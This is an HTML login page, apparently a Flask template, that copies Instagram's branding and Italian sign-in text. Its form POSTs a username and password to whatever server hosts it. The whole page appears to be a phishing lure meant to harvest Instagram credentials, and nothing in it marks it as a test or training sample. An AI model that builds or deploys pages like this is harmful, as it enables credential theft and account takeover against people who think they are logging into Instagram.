<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>

<style>
body{
    font-family:Arial;
    background:#fafafa;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.box{
    background:white;
    padding:30px;
    border:1px solid #ddd;
    width:300px;
    text-align:center;
}

input{
    width:100%;
    padding:10px;
    margin:8px 0;
}

button{
    background:#E1306C;
    color:white;
    border:none;
    padding:10px;
    width:100%;
}
</style>
</head>
<body>

<div class="box">

<img src="{{ url_for('static', filename='instagram_logo.png') }}" width="100">

<h2>Accedi a Instagram</h2>

<form method="POST">

<input name="username" placeholder="Telefono, username o email" required>
<input type="password" name="password" placeholder="Password" required>

<button type="submit">Accedi</button>

</form>

</div>

</body>
</html>
